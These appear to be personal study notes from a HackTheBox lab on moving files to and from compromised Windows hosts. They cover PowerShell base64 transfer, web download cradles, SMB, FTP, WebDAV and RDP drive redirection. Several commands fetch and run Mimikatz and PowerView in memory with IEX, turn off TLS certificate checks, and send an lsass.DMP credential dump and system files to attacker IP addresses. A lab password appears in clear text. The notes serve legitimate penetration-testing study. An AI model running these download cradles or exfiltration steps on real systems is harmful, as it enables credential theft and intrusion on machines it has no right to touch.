
### PowerShell Base64 Encode and Decode

- We can encode a file to a base64 string, copy it and decode the file in the target system if we have terminal access in the target system.
- We do not need network communication.

**On the attacker machine :** 
```python
cat id_rsa |base64 -w 0;echo
```
- Copy this string and paste it into the target machine and decode it.
**Decoding in Windows :** 
```python
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(""))
```

### PowerShell Web Downloads

- Most companies allow `HTTP` and `HTTPS` outbound traffic through their firewall.
- The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:


| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

#### PowerShell DownloadFile Method

- We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.
**File Download** : 
```python
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### PowerShell DownloadString - Fileless Method

- Fileless attacks work by using some operating system functions to download the payload and execute it directly.
- Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
```python
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input : 

```python
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest
- From powershell 3.0 onwards.
- You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
```python
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

> Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

### Common Errors with PowerShell

**Internet Explorer first-launch configuration has not been completed which can prevent download** : 
-  We can bypass it by using the parameter - `UseBasicParsing`.
```python
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

**SSL/TLS secure channel issue if certificate is not trusted :** 
- We can bypass that error with the following command : 
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


### SMB Downloads

- Refer to [[6. SMB]] foot printing.
- We can create a SMB server in our attack machine by using the [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

Creating an SMB server : 

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

To Download a file from the SMB server to the current working directory, we can use the command : 

##### Copy a File from the SMB server

```python
C:\htb> copy \\192.168.220.133\share\nc.exe
```

> Newer versions of windows block unauthenticated guest access, to work around that, we can set a username and password using Impacket SMB server and mount the SMB server on our windows target machine.

Error we face when we try unauthenticated guest access : 

```python
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

##### Creating an SMB server with a username and password

```python
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

- In order to mount the SMB server with the username and password on our windows target, use the following command : 
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

## FTP Downloads

- We can use the FTP client or Powershell `Net.WebClient` to download files from an FTP server.
- We can configure and FTP server in our attack host using python3 `pyftpdlib` module
```bash
sudo pip3 install pyftpdlib
```

###### Setting up a Python3 FTP Server

```bash
sudo python3 -m pyftpdlib --port 21
```

- After setting up the FTP server on our attack host, we can perform file transfers using the pre-installed FTP client from windows or PowerShell `Net.WebClient`.
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Demo on Creating a Command File for the FTP Client and Download the Target File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


## Upload Operations

- Uploading files from our target machine to our attack host.

#### Powershell Base64 Encode & Decode

```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))



PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

- Just copy this string back to our attackhost and then use base64 command to decode it.
- We can use md5sum application to confirm the transfer happened correctly.
#### Decoding base64 string

```shell-session
echo  | base64 -d > hosts
```

```shell-session
HrithikManoj000@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts

# see.. the hash remains the same, which means it was transferred correctly
```

#### PowerShell Web Uploads
- PowerShell does not have a built in upload functionality.
- we can use `Invoke-WebRequest` or `Invoke-RestMethod `to build our upload function.
- Then we need a web server to accept uploads, for that we can use [uploadserver](https://github.com/Densaugeo/uploadserver) module from Python HTTP.server module.
```
pip3 install uploadserver
python3 -m uploadserver
```

#### PowerShell Script to Upload a File to Python Upload Server

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://10.10.15.6:8000/upload -File 
C:\Users\htb-student\AppData\Local\Temp\lsass.DMP

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

## How it worked for me
- Step 1 : on the attack machine download and host the PSUpload.ps1 script
```
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1

python3 -m http.server 8000
```

- Step 2: On the victim machine: 
```

#Import the function into memory

IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.6:8000/PSUpload.ps1')
```
- Step 3: start the uploadserver using the command above and then execute the file upload :
```

#Execute the payload;
Invoke-FileUpload -Uri http://10.10.15.6:8000/upload -File C:\Users\htb-student\AppData\Local\Temp\lsass.DMP
```


### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.


```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Netcat Listener :** 

```bash
nc -nvlp 8000
```

Convert the received base64 string back to file : 

```bash
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Uploads
- Usually enterprises don't allow SMB protocol (TCP/445) out of their internal network.
- We can run SMB over HTTP with `WebDav.WebDAV` (It is an extension of HTTP)
- The WebDAV protocol enables a webserver to behave like a fileserver.
- When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.

### Configuring WebDav Server

```bash
sudo pip3 install wsgidav cheroot
```

#### Using the WebDav Python module


```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```


#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

  Windows File Transfer Methods

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

> `DavWWWRoot` is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder


#### Uploading Files using SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.


### FTP Uploads
- Similar to downloading files using FTP
```shell-session
sudo python3 -m pyftpdlib --port 21 --write
# --write switch allow clients to upload files to our attack host.
```

Now in order to upload the file from our target windows machine to our attack host, we can use the Net.Webclient method. command given below : 

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Demo upload operation by creating a file (Just as an example)

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---
## Transferring Files Back to Attack Host via RDP Drive Redirection

When SMB and HTTP uploads are blocked/unreachable, use RDP drive redirection — it piggybacks on the existing RDP session so no extra ports needed.

**Step 1 — Connect via xfreerdp with drive redirection:**

bash

```python
xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:loot,/home/htb-ac-2081772/lab
```

**Step 2 — Inside the RDP session, copy the file:**

powershell

```python
copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\loot\
```

File lands directly in `~/lab/` on your attack host.


